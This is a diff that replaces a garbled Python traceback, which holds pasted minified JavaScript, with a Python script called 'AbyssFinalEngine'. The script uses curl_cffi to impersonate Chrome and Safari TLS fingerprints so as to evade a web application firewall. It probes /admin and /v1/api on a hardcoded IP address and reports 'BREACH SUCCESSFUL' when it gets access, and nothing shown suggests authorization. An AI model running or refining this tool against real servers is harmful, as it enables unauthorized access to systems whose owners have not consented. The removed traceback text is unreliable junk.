@@ -1,4 +1,57 @@
-File "/home/ghost/Desktop/ru.py", line 4
-    `);return i!==-1&&(t=yue(t,n,s,i)),s+t+n};Object.defineProperties(Do.prototype,Qi);var vue=Do(),Sue=Do({level:cm?cm.level:0});Object.defineProperty(cr,"backgroundColorNames",{enumerable:!0,get:function(){return Mt.backgroundColorNames}});Object.defineProperty(cr,"backgroundColors",{enumerable:!0,get:function(){return Mt.backgroundColorNames}});Object.defineProperty(cr,"colorNames",{enumerable:!0,get:function(){return Mt.colorNames}});Object.defineProperty(cr,"colors",{enumerable:!0,get:function(){return Mt.colorNames}});Object.defineProperty(cr,"foregroundColorNames",{enumerable:!0,get:function(){return Mt.foregroundColorNames}});Object.defineProperty(cr,"foregroundColors",{enumerable:!0,get:function(){return Mt.foregroundColorNames}});Object.defineProperty(cr,"modifierNames",{enumerable:!0,get:function(){return Mt.modifierNames}});Object.defineProperty(cr,"modifiers",{enumerable:!0,get:function(){return Mt.modifierNames}});cr.Chalk=Sc;cr.chalkStderr=Sue;cr.default=vue;cr.supportsColor=lm;cr.supportsColorStderr=cm;(function(){let e=vc.exports,t=e.default;t.Instance=Sc,vc.exports=t;for(let r of Object.keys(e))vc.exports[r]=e[r]})()});var YP=y(wo=>{"use strict";Object.defineProperty(wo,"__esModule",{value:!0});wo.default=Iue;wo.getChalk=HP;wo.shouldHighlight=zP;var xue=BP(),KP=ji(),hm=WP(),Pue=new Set(["as","async","from","get","of","set"]);function Cue(e){return{keyword:e.cyan,capitalized:e.yellow,jsxIdentifier:e.yellow,punctuator:e.yellow,number:e.magenta,string:e.green,regex:e.magenta,comment:e.grey,invalid:e.white.bgRed.bold}}var Aue=/\r\n|[\n\r\u2028\u2029]/,Due=/^[()[\]{}]$/,GP;{let e=/^[a-z][\w-]*$/i,t=function(r){if(r.type==="name"){if((0,KP.isKeyword)(r.value)||(0,KP.isStrictReservedWord)(r.value,!0)||Pue.has(r.value))return"keyword";if(e.test(r.value))return"jsxIdentifier";if(r.value[0]!==r.value[0].toLowerCase())return"capitalized"}return r.type==="punctuator"&&Due.test(r.value)?"bracket":r.type==="invalid"&&(r.value==="@"||r.value==="#")?"punctuator":r.type};GP=function*(r){for(let s of xue(r))yield{type:t(s),value:s.value}}}function wue(e,t){let r="";for(let{type:s,value:n}of GP(t)){let i=e[s];i?r+=n.split(Aue).map(a=>i(a)).join(`
-     ^
-SyntaxError: unmatched ')'
+import asyncio
+import re
+from curl_cffi.requests import AsyncSession
+
+class AbyssFinalEngine:
+    def __init__(self, target_ip):
+        self.target_url = f"https://{target_ip}"
+        # اختيار بصمات حديثة جداً لتجاوز JA3/JA4
+        self.profiles = ["chrome124", "safari17_0", "chrome110"]
+
+    async def probe(self, path):
+        url = f"{self.target_url}{path}"
+        print(f"[*] Analyzing: {path}")
+        
+        # استخدام Session للحفاظ على الكوكيز وإدارة HTTP/2
+        async with AsyncSession(verify=False) as session:
+            for profile in self.profiles:
+                print(f"[*] Impersonating: {profile}")
+                try:
+                    # محاكاة كاملة للمتصفح (TLS + Headers + HTTP/2)
+                    response = await session.get(url, impersonate=profile, timeout=20)
+                    
+                    status = response.status_code
+                    print(f"[+] Status: {status} | Size: {len(response.content)}")
+
+                    if status == 200:
+                        print(f"[!!!] BREACH SUCCESSFUL WITH {profile}!")
+                        title = re.search('<title>(.*?)</title>', response.text, re.I)
+                        print(f"[*] Title: {title.group(1) if title else 'N/A'}")
+                        return # توقف عند النجاح
+                    
+                    elif status == 406:
+                        print(f"[-] 406 Reject: The WAF signature for {profile} is still detected.")
+                    
+                    elif status == 403:
+                        print(f"[-] 403 Forbidden: WAF bypassed, but access denied by ACL.")
+
+                except Exception as e:
+                    print(f"[-] Error testing {profile}: {str(e)}")
+
+async def main():
+    TARGET = "94.55.118.66"
+    engine = AbyssFinalEngine(TARGET)
+    
+    # اختبار المسارات التي أعطت 406 سابقاً
+    for path in ["/admin", "/v1/api"]:
+        await engine.probe(path)
+        print("-" * 30)
+
+if __name__ == "__main__":
+    # تشغيل المحرك بطريقة متوافقة مع asyncio الحديث
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
+        print(f"[!] System Error: {e}")
